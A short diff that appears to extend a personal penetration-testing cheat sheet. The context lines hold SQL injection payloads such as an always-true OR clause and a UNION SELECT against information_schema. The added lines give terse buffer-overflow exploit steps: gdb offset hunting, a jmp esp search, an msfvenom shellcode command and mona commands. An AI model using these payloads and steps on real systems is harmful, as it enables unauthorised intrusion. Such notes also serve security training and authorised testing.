@@ -65,3 +65,20 @@ ram' OR 1='1
 url()
 category=1 or 1=1
 UNION SELECT 1,table_name,3 FROM information_schema.tables
+
+# DEV EXPLOIT
+gdb 
+wiremask 
+look for off set for eip 
+gdb pdisass main
+env - gdb (file)
+show env
+unset env
+run and crash the program
+info proc map
+find /b (start of heap), (end of stack), 0xff, 0xef
+find jump to eip to jum esp
+msfvenom -p linux/x86/exec CMD=ifconfig -b '\x00' -f python
+
+!mona modules
+!mona jmp -r esp -m
